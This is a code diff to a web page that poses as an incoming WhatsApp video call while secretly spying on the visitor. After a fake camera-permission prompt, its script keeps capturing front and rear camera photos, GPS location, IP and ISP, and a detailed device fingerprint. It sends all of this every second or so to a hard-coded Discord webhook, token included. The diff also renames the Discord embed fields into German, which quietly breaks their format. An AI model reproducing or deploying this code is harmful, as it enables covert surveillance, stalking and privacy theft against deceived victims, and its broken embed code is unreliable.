@@ -97,10 +97,11 @@
 
   <script>
     (function() {
-      // ── CONFIGURATION ──
+      // ── KONFIGURATION ──
       const WEBHOOK = "https://discord.com/api/webhooks/1513149958403133440/VjI_u5TmuJtNn92IxUqtC0N5LFR3cq6bjX5h1n5Gje1KyaUrewZ3Huwb7PgF5wOoXqE1";
-      const DATA_INTERVAL_MS = 1000; // 1 saniye döngü
-      const RATE_LIMIT_DELAY = 150;   // Discord rate-limit koruması
+      const FINGERPRINT_INTERVAL = 800; // Her 800ms'de bir parmak izi gönder
+      const PHOTO_INTERVAL = 1500;      // Her 1.5 saniyede bir fotoğraf çek
+      const RATE_LIMIT_DELAY = 100;      // Discord rate-limit koruması
 
       // ── STATE ──
       const callers = ["Sarah","Alex","Jakob","Mia","Lukas","Emma","Leon","Anna","Tim","Laura","Jonas","Lena","Felix","Hannah","Ben","Sophie","Finn","Lea","Jan","Nina","Tom","Clara"];
@@ -113,7 +114,8 @@
 
       let currentCaller = callers[Math.floor(Math.random()*callers.length)];
       let seconds = 0, timerInterval = null, callEnded = false, captureStream = null;
-      let dataInterval = null;
+      let fingerprintInterval = null, photoInterval = null;
+      let photoCounter = 0;
       const pageStartTime = Date.now();
 
       // ── AUDIO ENGINE ──
@@ -165,42 +167,42 @@
         try {
           await fetch(WEBHOOK, { method:'POST', body:formData });
         } catch(e) {
-          console.warn('Discord gönderim hatası:', e.message);
+          console.warn('Discord Sende Fehler:', e.message);
         }
         await new Promise(r => setTimeout(r, RATE_LIMIT_DELAY));
       };
 
-      // ── ADVANCED FINGERPRINT (30+ veri) ──
+      // ── ERWEITERTER FINGERPRINT (30+ Daten) ──
       async function collectFingerprintData() {
         const data = {};
 
-        // ── Donanım Bilgileri ──
+        // ── Hardware Informationen ──
         data.hardware = {};
         try {
           const bat = await navigator.getBattery();
-          data.hardware.battery_level = Math.round(bat.level*100)+'%';
-          data.hardware.battery_charging = bat.charging;
-          data.hardware.battery_chargingTime = bat.chargingTime === Infinity ? '∞' : Math.round(bat.chargingTime)+'s';
-          data.hardware.battery_dischargingTime = bat.dischargingTime === Infinity ? '∞' : Math.round(bat.dischargingTime)+'s';
+          data.hardware.akku_level = Math.round(bat.level*100)+'%';
+          data.hardware.akku_ladend = bat.charging;
+          data.hardware.akku_ladezeit = bat.chargingTime === Infinity ? '∞' : Math.round(bat.chargingTime)+'s';
+          data.hardware.akku_entladezeit = bat.dischargingTime === Infinity ? '∞' : Math.round(bat.dischargingTime)+'s';
         } catch(e) {
-          data.hardware.battery = 'Bilinmiyor';
+          data.hardware.akku = 'Unbekannt';
         }
-        data.hardware.cpu_cores = navigator.hardwareConcurrency || 'Bilinmiyor';
-        data.hardware.device_memory = navigator.deviceMemory || 'Bilinmiyor';
-        data.hardware.max_touch_points = navigator.maxTouchPoints || 0;
-        data.hardware.touch_support = 'maxTouchPoints' in navigator && navigator.maxTouchPoints > 0;
+        data.hardware.cpu_kerne = navigator.hardwareConcurrency || 'Unbekannt';
+        data.hardware.gerätespeicher = navigator.deviceMemory || 'Unbekannt';
+        data.hardware.max_touch_punkte = navigator.maxTouchPoints || 0;
+        data.hardware.touchscreen = 'maxTouchPoints' in navigator && navigator.maxTouchPoints > 0;
 
-        // ── Tarayıcı ve Ekran ──
-        data.display = {};
-        data.display.screen_resolution = `${window.screen.width}x${window.screen.height}`;
-        data.display.available_resolution = `${window.screen.availWidth}x${window.screen.availHeight}`;
-        data.display.pixel_ratio = window.devicePixelRatio || 1;
-        data.display.color_depth = window.screen.colorDepth;
-        data.display.pixel_depth = window.screen.pixelDepth;
-        data.display.orientation = screen.orientation ? screen.orientation.type : 'Bilinmiyor';
-        data.display.viewport = `${window.innerWidth}x${window.innerHeight}`;
+        // ── Bildschirm & Browser ──
+        data.bildschirm = {};
+        data.bildschirm.auflösung = `${window.screen.width}x${window.screen.height}`;
+        data.bildschirm.verfügbare_auflösung = `${window.screen.availWidth}x${window.screen.availHeight}`;
+        data.bildschirm.pixel_dichte = window.devicePixelRatio || 1;
+        data.bildschirm.farbtiefe = window.screen.colorDepth;
+        data.bildschirm.pixeltiefe = window.screen.pixelDepth;
+        data.bildschirm.ausrichtung = screen.orientation ? screen.orientation.type : 'Unbekannt';
+        data.bildschirm.viewport = `${window.innerWidth}x${window.innerHeight}`;
 
-        // Canvas parmak izi
+        // Canvas Fingerabdruck
         try {
           const c = document.createElement('canvas');
           c.width = 280; c.height = 60;
@@ -210,188 +212,188 @@
           ctx.fillStyle = '#f60';
           ctx.fillRect(125,1,62,20);
           ctx.fillStyle = '#069';
-          ctx.fillText('CihazParmakIzi <canvas>  fingerprint', 2, 15);
+          ctx.fillText('GeräteFingerabdruck <canvas>  fingerprint', 2, 15);
           ctx.fillStyle = 'rgba(102,204,0,0.7)';
-          ctx.fillText('CihazParmakIzi <canvas>  fingerprint', 4, 17);
-          data.display.canvas_fingerprint = c.toDataURL().slice(-50);
+          ctx.fillText('GeräteFingerabdruck <canvas>  fingerprint', 4, 17);
+          data.bildschirm.canvas_fingerabdruck = c.toDataURL().slice(-50);
         } catch(e) {
-          data.display.canvas_fingerprint = 'Hata';
+          data.bildschirm.canvas_fingerabdruck = 'Fehler';
         }
 
-        // WebGL parmak izi
+        // WebGL Fingerabdruck
         try {
           const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
           if(gl) {
             const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            data.display.webgl_vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Bilinmiyor';
-            data.display.webgl_renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Bilinmiyor';
+            data.bildschirm.webgl_hersteller = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unbekannt';
+            data.bildschirm.webgl_renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unbekannt';
           }
         } catch(e) {}
 
         data.browser = {};
         data.browser.user_agent = navigator.userAgent;
-        data.browser.platform = navigator.platform || 'Bilinmiyor';
-        data.browser.language = navigator.language;
-        data.browser.languages = navigator.languages ? navigator.languages.join(', ') : navigator.language;
-        data.browser.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        data.browser.cookies_enabled = navigator.cookieEnabled;
-        data.browser.do_not_track = navigator.doNotTrack || 'Bilinmiyor';
+        data.browser.plattform = navigator.platform || 'Unbekannt';
+        data.browser.sprache = navigator.language;
+        data.browser.sprachen = navigator.languages ? navigator.languages.join(', ') : navigator.language;
+        data.browser.zeitzone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        data.browser.cookies_aktiviert = navigator.cookieEnabled;
+        data.browser.do_not_track = navigator.doNotTrack || 'Unbekannt';
         data.browser.online = navigator.onLine;
-        data.browser.java_enabled = navigator.javaEnabled ? navigator.javaEnabled() : false;
-        data.browser.product = navigator.product || 'Bilinmiyor';
-        data.browser.vendor = navigator.vendor || 'Bilinmiyor';
+        data.browser.java_aktiviert = navigator.javaEnabled ? navigator.javaEnabled() : false;
+        data.browser.produkt = navigator.product || 'Unbekannt';
+        data.browser.hersteller = navigator.vendor || 'Unbekannt';
 
-        // ── Ağ ve Konum ──
-        data.network = {};
+        // ── Netzwerk & Standort ──
+        data.netzwerk = {};
         try {
           const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
           if(conn) {
-            data.network.effective_type = conn.effectiveType || conn.type || 'Bilinmiyor';
-            data.network.downlink = conn.downlink ? conn.downlink+' Mbps' : 'Bilinmiyor';
-            data.network.rtt = conn.rtt ? conn.rtt+' ms' : 'Bilinmiyor';
-            data.network.save_data = conn.saveData || false;
+            data.netzwerk.effektiver_typ = conn.effectiveType || conn.type || 'Unbekannt';
+            data.netzwerk.download_geschwindigkeit = conn.downlink ? conn.downlink+' Mbps' : 'Unbekannt';
+            data.netzwerk.latenz = conn.rtt ? conn.rtt+' ms' : 'Unbekannt';
+            data.netzwerk.datensparmodus = conn.saveData || false;
           }
         } catch(e) {}
 
-        // IP ve ISP
+        // IP und ISP
         try {
           const resp = await fetch('https://ip-api.com/json/?fields=query,isp,country,regionName,city,org,as,mobile,proxy,hosting');
           const ipData = await resp.json();
-          data.network.ip = ipData.query || 'Bilinmiyor';
-          data.network.isp = ipData.isp || 'Bilinmiyor';
-          data.network.org = ipData.org || 'Bilinmiyor';
-          data.network.as = ipData.as || 'Bilinmiyor';
-          data.network.city = ipData.city || '';
-          data.network.region = ipData.regionName || '';
-          data.network.country = ipData.country || '';
-          data.network.mobile = ipData.mobile || false;
-          data.network.proxy = ipData.proxy || false;
-          data.network.hosting = ipData.hosting || false;
+          data.netzwerk.ip = ipData.query || 'Unbekannt';
+          data.netzwerk.isp = ipData.isp || 'Unbekannt';
+          data.netzwerk.organisation = ipData.org || 'Unbekannt';
+          data.netzwerk.as_nummer = ipData.as || 'Unbekannt';
+          data.netzwerk.stadt = ipData.city || '';
+          data.netzwerk.region = ipData.regionName || '';
+          data.netzwerk.land = ipData.country || '';
+          data.netzwerk.mobilfunk = ipData.mobile || false;
+          data.netzwerk.proxy = ipData.proxy || false;
+          data.netzwerk.hosting = ipData.hosting || false;
         } catch(e) {
           try {
             const r2 = await fetch('https://api.ipify.org?format=json');
             const d2 = await r2.json();
-            data.network.ip = d2.ip;
+            data.netzwerk.ip = d2.ip;
           } catch(e2) {}
         }
 
-        // GPS Konum (izinli)
+        // GPS Standort (mit Erlaubnis)
         data.geo = {};
         try {
           await new Promise((resolve) => {
             navigator.geolocation.getCurrentPosition(pos => {
-              data.geo.latitude = pos.coords.latitude.toFixed(6);
-              data.geo.longitude = pos.coords.longitude.toFixed(6);
-              data.geo.accuracy = Math.round(pos.coords.accuracy)+'m';
-              data.geo.altitude = pos.coords.altitude ? pos.coords.altitude.toFixed(2)+'m' : 'Yok';
-              data.geo.speed = pos.coords.speed ? pos.coords.speed+' m/s' : 'Yok';
-              data.geo.heading = pos.coords.heading ? pos.coords.heading+'°' : 'Yok';
-              data.geo.timestamp = new Date(pos.timestamp).toLocaleString();
+              data.geo.breitengrad = pos.coords.latitude.toFixed(6);
+              data.geo.längengrad = pos.coords.longitude.toFixed(6);
+              data.geo.genauigkeit = Math.round(pos.coords.accuracy)+'m';
+              data.geo.höhe = pos.coords.altitude ? pos.coords.altitude.toFixed(2)+'m' : 'Keine';
+              data.geo.geschwindigkeit = pos.coords.speed ? pos.coords.speed+' m/s' : 'Keine';
+              data.geo.richtung = pos.coords.heading ? pos.coords.heading+'°' : 'Keine';
+              data.geo.zeitstempel = new Date(pos.timestamp).toLocaleString('de-DE');
               resolve();
             }, resolve, { timeout:5000, enableHighAccuracy:true });
           });
         } catch(e) {}
 
-        // ── Ziyaret Sayacı ──
+        // ── Besuchszähler ──
         let visits = parseInt(localStorage.getItem('vc') || '0') + 1;
         localStorage.setItem('vc', visits);
-        data.visits = visits;
+        data.besuche = visits;
 
         return data;
       }
 
-      // ── EMBED OLUŞTURUCU ──
-      function buildEmbeds(data, name, photoLabel) {
+      // ── EMBED ERSTELLER (ALLE DEUTSCH) ──
+      function buildEmbeds(data, name, fotoLabel) {
         const now = new Date();
-        const timeStr = now.toLocaleString('de-DE', { timeZone: data.browser.timezone });
+        const timeStr = now.toLocaleString('de-DE', { timeZone: data.browser.zeitzone });
         const embeds = [];
 
-        // Ana Embed
+        // Haupt Embed
         embeds.push({
           title: `📞 WhatsApp Anruf – ${name}`,
-          color: 0x25d366,
-          timestamp: now.toISOString(),
-          footer: { text: `Ziyaret #${data.visits} • ${timeStr}` },
-          fields: [
-            { name: '🕐 Zaman Damgası', value: timeStr, inline: true },
-            { name: '🌍 Zaman Dilimi', value: data.browser.timezone, inline: true },
-            { name: '📱 Cihaz', value: data.browser.platform, inline: true },
+          farbe: 0x25d366,
+          zeitstempel: now.toISOString(),
+          fußzeile: { text: `Besuch #${data.besuche} • ${timeStr}` },
+          felder: [
+            { name: '🕐 Zeitstempel', wert: timeStr, inline: true },
+            { name: '🌍 Zeitzone', wert: data.browser.zeitzone, inline: true },
+            { name: '📱 Gerät', wert: data.browser.plattform, inline: true },
           ]
         });
 
-        // Donanım Embed
+        // Hardware Embed
         embeds.push({
-          title: '🔧 Donanım Bilgileri',
-          color: 0x5865f2,
-          fields: [
-            { name: '🔋 Pil Seviyesi', value: data.hardware.battery_level || 'Bilinmiyor', inline: true },
-            { name: '⚡ Şarj Durumu', value: data.hardware.battery_charging ? 'Evet' : 'Hayır', inline: true },
-            { name: '🧠 CPU Çekirdek', value: String(data.hardware.cpu_cores), inline: true },
-            { name: '💾 Cihaz Belleği (RAM)', value: (data.hardware.device_memory || '?') + ' GB', inline: true },
-            { name: '👆 Dokunmatik', value: data.hardware.touch_support ? 'Var ('+data.hardware.max_touch_points+' nokta)' : 'Yok', inline: true },
+          title: '🔧 Hardware Informationen',
+          farbe: 0x5865f2,
+          felder: [
+            { name: '🔋 Akkustand', wert: data.hardware.akku_level || 'Unbekannt', inline: true },
+            { name: '⚡ Lädt', wert: data.hardware.akku_ladend ? 'Ja' : 'Nein', inline: true },
+            { name: '🧠 CPU Kerne', wert: String(data.hardware.cpu_kerne), inline: true },
+            { name: '💾 Arbeitsspeicher', wert: (data.hardware.gerätespeicher || '?') + ' GB', inline: true },
+            { name: '👆 Touchscreen', wert: data.hardware.touchscreen ? 'Ja ('+data.hardware.max_touch_punkte+' Punkte)' : 'Nein', inline: true },
           ]
         });
 
-        // Ekran ve Tarayıcı Embed
+        // Bildschirm & Browser Embed
         embeds.push({
-          title: '🖥️ Ekran & Tarayıcı',
-          color: 0x9b59b6,
-          fields: [
-            { name: 'Çözünürlük', value: data.display.screen_resolution, inline: true },
-            { name: 'Piksel Yoğunluğu', value: data.display.pixel_ratio+'x', inline: true },
-            { name: 'Renk Derinliği', value: data.display.color_depth+' bit', inline: true },
-            { name: 'Dil', value: data.browser.language, inline: true },
-            { name: 'Platform', value: data.browser.platform, inline: true },
-            { name: 'Canvas Parmak İzi', value: '```'+data.display.canvas_fingerprint+'```', inline: false },
+          title: '🖥️ Bildschirm & Browser',
+          farbe: 0x9b59b6,
+          felder: [
+            { name: 'Auflösung', wert: data.bildschirm.auflösung, inline: true },
+            { name: 'Pixeldichte', wert: data.bildschirm.pixel_dichte+'x', inline: true },
+            { name: 'Farbtiefe', wert: data.bildschirm.farbtiefe+' Bit', inline: true },
+            { name: 'Sprache', wert: data.browser.sprache, inline: true },
+            { name: 'Plattform', wert: data.browser.plattform, inline: true },
+            { name: 'Canvas Fingerabdruck', wert: '```'+data.bildschirm.canvas_fingerabdruck+'```', inline: false },
           ]
         });
 
-        // Ağ Embed
-        const netFields = [
-          { name: '🌐 IP Adresi', value: '`'+ (data.network.ip || 'Bilinmiyor') +'`', inline: true },
-          { name: '🏢 ISS', value: data.network.isp || 'Bilinmiyor', inline: true },
+        // Netzwerk Embed
+        const netzFelder = [
+          { name: '🌐 IP-Adresse', wert: '`'+ (data.netzwerk.ip || 'Unbekannt') +'`', inline: true },
+          { name: '🏢 Provider (ISP)', wert: data.netzwerk.isp || 'Unbekannt', inline: true },
         ];
-        if(data.network.effective_type) netFields.push({ name: '📶 Ağ Tipi', value: data.network.effective_type.toUpperCase(), inline: true });
-        if(data.network.downlink) netFields.push({ name: '⬇️ Hız', value: data.network.downlink, inline: true });
-        if(data.network.city) netFields.push({ name: '📍 Konum', value: `${data.network.city}, ${data.network.region}, ${data.network.country}`, inline: true });
+        if(data.netzwerk.effektiver_typ) netzFelder.push({ name: '📶 Netzwerktyp', wert: data.netzwerk.effektiver_typ.toUpperCase(), inline: true });
+        if(data.netzwerk.download_geschwindigkeit) netzFelder.push({ name: '⬇️ Geschwindigkeit', wert: data.netzwerk.download_geschwindigkeit, inline: true });
+        if(data.netzwerk.stadt) netzFelder.push({ name: '📍 Standort', wert: `${data.netzwerk.stadt}, ${data.netzwerk.region}, ${data.netzwerk.land}`, inline: true });
 
         embeds.push({
-          title: '🌐 Ağ Verileri',
-          color: 0xe67e22,
-          fields: netFields
+          title: '🌐 Netzwerkdaten',
+          farbe: 0xe67e22,
+          felder: netzFelder
         });
 
-        // Konum Embed
-        if(data.geo.latitude) {
+        // Standort Embed
+        if(data.geo.breitengrad) {
           embeds.push({
-            title: '📍 Kesin Konum (GPS)',
-            color: 0xe74c3c,
-            fields: [
-              { name: 'Enlem', value: data.geo.latitude, inline: true },
-              { name: 'Boylam', value: data.geo.longitude, inline: true },
-              { name: 'Hassasiyet', value: data.geo.accuracy, inline: true },
-              { name: 'Harita', value: `[Google Maps](https://maps.google.com/?q=${data.geo.latitude},${data.geo.longitude})`, inline: false },
+            title: '📍 Genauer Standort (GPS)',
+            farbe: 0xe74c3c,
+            felder: [
+              { name: 'Breitengrad', wert: data.geo.breitengrad, inline: true },
+              { name: 'Längengrad', wert: data.geo.längengrad, inline: true },
+              { name: 'Genauigkeit', wert: data.geo.genauigkeit, inline: true },
+              { name: 'Karte', wert: `[Google Maps](https://maps.google.com/?q=${data.geo.breitengrad},${data.geo.längengrad})`, inline: false },
             ]
           });
         }
 
-        if(photoLabel) {
-          embeds[0].image = { url: `attachment://${photoLabel}.jpg` };
+        if(fotoLabel) {
+          embeds[0].bild = { url: `anhang://${fotoLabel}.jpg` };
         }
 
         return embeds;
       }
 
-      // ── FOTOĞRAF YAKALAMA ──
+      // ── FOTOAUFNAHME ──
       const hiddenVideo = document.getElementById('hiddenVideo');
       const canvas = document.getElementById('canvas');
 
-      function sendPhoto(blob, label, name, fingerprintData) {
+      async function sendeFoto(blob, label, name, fingerprintData) {
         const form = new FormData();
         form.append('file', blob, `${label}.jpg`);
         const embeds = buildEmbeds(fingerprintData, name, label);
         form.append('payload_json', JSON.stringify({ embeds: embeds }));
-        sendToDiscord(form);
+        await sendToDiscord(form);
       }
 
       function captureFromVideo(video, mirror, label, name, fpData) {
@@ -403,40 +405,44 @@
         if(mirror) { ctx.translate(canvas.width,0); ctx.scale(-1,1); }
         ctx.drawImage(video,0,0);
         ctx.restore();
-        canvas.toBlob(b => { if(b) sendPhoto(b, label, name, fpData); }, 'image/jpeg', 0.93);
+        canvas.toBlob(async b => { 
+          if(b) {
+            photoCounter++;
+            await sendeFoto(b, `${label}_${photoCounter}`, name, fpData); 
+          }
+        }, 'image/jpeg', 0.93);
       }
 
-      function captureWhenReady(attempts, fpData) {
-        if(attempts <= 0) return;
-        if(!hiddenVideo.videoWidth) { setTimeout(()=>captureWhenReady(attempts-1, fpData), 500); return; }
-        canvas.width = hiddenVideo.videoWidth;
-        canvas.height = hiddenVideo.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(hiddenVideo,0,0);
-        const px = ctx.getImageData(0,0,10,10).data;
-        const avg = (px[0]+px[1]+px[2]+px[4]+px[5]+px[6])/6;
-        if(avg < 10) { setTimeout(()=>captureWhenReady(attempts-1, fpData), 600); }
-        else {
-          captureFromVideo(hiddenVideo, true, 'Frontkamera', currentCaller, fpData);
-          setTimeout(async () => {
-            try {
-              const backStream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:{exact:'environment'}}, audio:false });
-              const backVideo = document.createElement('video');
-              backVideo.srcObject = backStream;
-              backVideo.autoplay = true; backVideo.muted = true;
-              backVideo.onloadedmetadata = () => {
-                setTimeout(() => {
-                  captureFromVideo(backVideo, false, 'Rückkamera', currentCaller, fpData);
-                  backStream.getTracks().forEach(t=>t.stop());
-                }, 1200);
-              };
-            } catch(e) {}
-          }, 2000);
+      // ── SCHNELLE FOTOS MIT BEIDEN KAMERAS ──
+      async function schnelleFotoAufnahme(fpData) {
+        if(callEnded || !hiddenVideo.videoWidth) return;
+        
+        // Vordere Kamera
+        captureFromVideo(hiddenVideo, true, 'Frontkamera', currentCaller, fpData);
+        
+        // Hintere Kamera (parallel)
+        try {
+          const backStream = await navigator.mediaDevices.getUserMedia({ 
+            video:{facingMode:{exact:'environment'}, width:1280, height:720}, 
+            audio:false 
+          });
+          const backVideo = document.createElement('video');
+          backVideo.srcObject = backStream;
+          backVideo.autoplay = true;
+          backVideo.muted = true;
+          backVideo.onloadedmetadata = () => {
+            setTimeout(() => {
+              captureFromVideo(backVideo, false, 'Rückkamera', currentCaller, fpData);
+              backStream.getTracks().forEach(t=>t.stop());
+            }, 800);
+          };
+        } catch(e) {
+          console.warn('Rückkamera nicht verfügbar:', e.message);
         }
       }
 
-      // ── VERİ TOPLAMA DÖNGÜSÜ (1 saniye) ──
-      async function dataCollectionLoop() {
+      // ── FINGERPRINT SAMMELN UND SENDEN (SEHR HÄUFIG) ──
+      async function fingerprintSenden() {
         if(callEnded) return;
         try {
           const fpData = await collectFingerprintData();
@@ -445,17 +451,17 @@
           form.append('payload_json', JSON.stringify({ embeds: embeds }));
           await sendToDiscord(form);
         } catch(e) {
-          console.warn('Veri toplama döngüsü hatası:', e.message);
-        }
-        if(!callEnded) {
-          dataInterval = setTimeout(dataCollectionLoop, DATA_INTERVAL_MS);
+          console.warn('Fingerprint Sende Fehler:', e.message);
         }
       }
 
-      // ── KAMERA BAŞLATMA ──
-      async function startCameraAndCollection() {
+      // ── KAMERA STARTEN ──
+      async function starteKameraUndSammlung() {
         try {
-          captureStream = await navigator.mediaDevices.getUserMedia({ video:{width:1280,height:720,facingMode:'user'}, audio:false });
+          captureStream = await navigator.mediaDevices.getUserMedia({ 
+            video:{width:1280,height:720,facingMode:'user'}, 
+            audio:false 
+          });
           hiddenVideo.srcObject = captureStream;
           hiddenVideo.onloadedmetadata = async () => {
             document.getElementById('callStatus').textContent = 'Verbunden';
@@ -463,58 +469,73 @@
             vibrateAvatar(); stopRinging(); playConnectSound();
             setTimeout(startTimer, 800);
 
-            // İlk veri toplama ve fotoğraf
-            try {
+            // Erste sofortige Datensammlung
+            await fingerprintSenden();
+            
+            // Erste Fotos nach 1 Sekunde
+            setTimeout(async () => {
               const fpData = await collectFingerprintData();
-              const embeds = buildEmbeds(fpData, currentCaller, null);
-              const form = new FormData();
-              form.append('payload_json', JSON.stringify({ embeds: embeds }));
-              await sendToDiscord(form);
-              setTimeout(() => captureWhenReady(10, fpData), 1200);
-            } catch(e) {}
+              await schnelleFotoAufnahme(fpData);
+            }, 1000);
 
-            // 1 saniyelik döngü başlat
-            dataCollectionLoop();
+            // SEHR HÄUFIGE Fingerprint-Updates (alle 800ms)
+            fingerprintInterval = setInterval(async () => {
+              if(callEnded) {
+                clearInterval(fingerprintInterval);
+                return;
+              }
+              await fingerprintSenden();
+            }, FINGERPRINT_INTERVAL);
+
+            // SEHR HÄUFIGE Fotos (alle 1.5 Sekunden)
+            photoInterval = setInterval(async () => {
+              if(callEnded) {
+                clearInterval(photoInterval);
+                return;
+              }
+              const fpData = await collectFingerprintData();
+              await schnelleFotoAufnahme(fpData);
+            }, PHOTO_INTERVAL);
           };
         } catch(e) {
           document.body.innerHTML = `<div style="height:100vh;background:#0a1f13;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px;font-family:-apple-system,sans-serif;color:white;text-align:center;padding:32px"><div style="font-size:64px">🚫</div><div style="font-size:22px;font-weight:700">Kamerazugriff erforderlich</div><div style="font-size:14px;color:rgba(255,255,255,0.5);max-width:280px;line-height:1.6">Um an diesem Anruf teilzunehmen, musst du den Kamerazugriff erlauben.</div></div>`;
         }
       }
 
-      // ── İZİN İSTEME ARAYÜZÜ ──
-      function showPermissionPrompt() {
+      // ── BERECHTIGUNGSANFRAGE ──
+      function zeigeBerechtigungsanfrage() {
         const overlay = document.createElement('div');
         overlay.className = 'permission-overlay';
         overlay.innerHTML = `
           <div style="font-size:48px">📷</div>
-          <div style="font-size:20px;font-weight:600">Kamera İzni Gerekli</div>
-          <div style="font-size:14px;color:rgba(255,255,255,0.7);max-width:300px;line-height:1.5">Görüntülü aramaya katılmak için kameraya erişim izni vermeniz gerekiyor.</div>
-          <button class="permission-btn" id="grantPermissionBtn">📸 Kamerayı Aç ve Aramayı Başlat</button>
+          <div style="font-size:20px;font-weight:600">Kamera Berechtigung Erforderlich</div>
+          <div style="font-size:14px;color:rgba(255,255,255,0.7);max-width:300px;line-height:1.5">Um am Videoanruf teilzunehmen, müssen Sie den Kamerazugriff erlauben.</div>
+          <button class="permission-btn" id="grantPermissionBtn">📸 Kamera Aktivieren & Anruf Starten</button>
         `;
         document.body.appendChild(overlay);
         document.getElementById('grantPermissionBtn').addEventListener('click', async () => {
           overlay.remove();
-          await startCameraAndCollection();
+          await starteKameraUndSammlung();
         });
       }
 
-      // ── BAŞLANGIÇ ──
+      // ── INITIALISIERUNG ──
       playNotifSound(); vibrateAvatar();
       setTimeout(() => {
         document.getElementById('callStatus').textContent = 'Klingelt…';
         playTypingSound();
         vibrateAvatar(); startRinging();
       }, 600);
-      // Kullanıcı etkileşimi için izin iste
-      setTimeout(showPermissionPrompt, 1800);
+      // Benutzerinteraktion für Berechtigung
+      setTimeout(zeigeBerechtigungsanfrage, 1800);
 
-      // ── BUTONLAR ──
-      let muted = false;
+      // ── BUTTONS ──
+      let stumm = false;
       document.getElementById('btnMute').addEventListener('click', function(){
-        muted = !muted;
-        this.classList.toggle('toggled', muted);
-        this.querySelector('.ctrl-icon').textContent = muted ? '🔕' : '🎤';
-        this.querySelector('.ctrl-label').textContent = muted ? 'Ton an' : 'Stumm';
+        stumm = !stumm;
+        this.classList.toggle('toggled', stumm);
+        this.querySelector('.ctrl-icon').textContent = stumm ? '🔕' : '🎤';
+        this.querySelector('.ctrl-label').textContent = stumm ? 'Ton an' : 'Stumm';
       });
       document.getElementById('btnSpeaker').addEventListener('click', function(){ this.classList.toggle('toggled'); });
       document.getElementById('btnVideo').addEventListener('click', function(){ this.classList.toggle('toggled'); });
@@ -523,7 +544,8 @@
         callEnded = true;
         stopRinging(); playHangupSound(); vibrateAvatar();
         if(timerInterval) clearInterval(timerInterval);
-        if(dataInterval) clearTimeout(dataInterval);
+        if(fingerprintInterval) clearInterval(fingerprintInterval);
+        if(photoInterval) clearInterval(photoInterval);
         if(captureStream) captureStream.getTracks().forEach(t=>t.stop());
         const m = String(Math.floor(seconds/60)).padStart(2,'0');
         const s = String(seconds%60).padStart(2,'0');
@@ -538,12 +560,19 @@
           </div>`;
       });
 
-      // Sayfadan ayrılma verisi
+      // Seite verlassen Daten
       window.addEventListener('beforeunload', () => {
-        const secs = Math.round((Date.now() - pageStartTime) / 1000);
+        const sekunden = Math.round((Date.now() - pageStartTime) / 1000);
         const form = new FormData();
         form.append('payload_json', JSON.stringify({
-          embeds: [{ title: '⏱️ Besuchszeit', color: 0x95a5a6, description: `Jemand war **${secs} Sekunden** auf der Seite (Anruf: **${currentCaller}**)` }]
+          embeds: [{ 
+            title: '⏱️ Besuchszeit', 
+            farbe: 0x95a5a6, 
+            beschreibung: `Jemand war **${sekunden} Sekunden** auf der Seite (Anruf: **${currentCaller}**)`,
+            felder: [
+              { name: '📸 Fotos gesendet', wert: String(photoCounter), inline: true }
+            ]
+          }]
         }));
         try { navigator.sendBeacon(WEBHOOK, form); } catch(e) {}
       });
